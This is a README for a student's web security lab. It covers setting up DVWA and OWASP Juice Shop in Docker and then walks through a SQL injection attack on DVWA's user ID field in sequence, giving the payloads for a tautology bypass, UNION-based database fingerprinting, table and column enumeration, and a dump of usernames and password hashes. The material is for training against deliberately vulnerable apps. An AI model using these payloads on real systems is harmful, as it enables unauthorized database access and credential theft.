# 🛡️ Web Application Security Lab (OWASP Top 10)
This repository is a comprehensive guide to setting up a professional security research environment. It is part of my Cyber Security internship at Next Afield. The project focuses on identifying, exploiting, and fixing the OWASP Top 10 vulnerabilities.


### 🚀 Phase 1: Environment Setup (For Beginners)
If you are new to this, follow these exact steps to get your hacking lab running in minutes.

  1. Install Prerequisites
--> Before running the lab, make sure you have the following installed:

--> Docker Desktop: Download [Docker Desktop](https://www.docker.com/products/docker-desktop/) here (Essential for running the lab containers).

--> Git: (Optional, to clone this repository).

  2. Create the Lab Configuration
--> Create a new folder on your computer (e.g., C:\MySecurityLab).

--> Inside that folder, create a file named docker-compose.yml.

--> Copy the code from the docker-compose.yml file in this repository and paste it into your file.

  3. Launch the Lab
--> Open Command Prompt (CMD) or PowerShell.

--> Navigate to your folder: ```cd path/to/your/folder```

--> Run the command to start all security tools: ```docker-compose up -d```



### 📦 Phase 2: Accessing the Applications

Once the containers are running, open your browser and visit:

| Application | URL | Default Credentials |
| :--- | :--- | :--- |
| **DVWA** | `http://localhost:8081` | `admin` / `password` |
| **OWASP Juice Shop** | `http://localhost:3000` | N/A (Self-Registration) |


Important: After logging into DVWA for the first time, go to the "Setup / Reset DB" tab and click "Create / Reset Database" to initialize the lab.

### 🔍 Phase 3: Vulnerabilities & Proof of Concept (PoC)

🛠️ 1. SQL Injection (SQLi) - Deep Dive
Objective: Identify backend database structure and extract sensitive user data.

Target: User ID input field in DVWA (Security Level: Low).

Step-by-Step Exploitation:
A. Authentication Bypass (Tautology)

Payload: ```' OR '1'='1```

Purpose: To force the database to return all records by making the WHERE clause always true.

Result: Successfully bypassed ID lookup to list all registered users.

B. Database Metadata Extraction (Union-Based)

Payload: ```' UNION SELECT database(), version() #```

Purpose: To identify the active database name and the server version.

Result: Identified Database: dvwa | Version: 10.4.32-MariaDB.

C. Table Enumeration

Payload: ```' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' #```

Purpose: To list all tables existing within the identified database.

Result: Discovered critical tables: users and guestbook.

D. Column Enumeration

Payload: ```' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users' #```

Purpose: To find the names of columns (like usernames/passwords) inside the users table.

Result: Identified sensitive columns: user, password, user_id.

E. Full Data Extraction (The Dump)

Payload: ```' UNION SELECT user, password FROM users #```

Purpose: To extract the actual credentials of all users from the database.

Result: Successfully dumped all usernames and their corresponding hashed passwords.
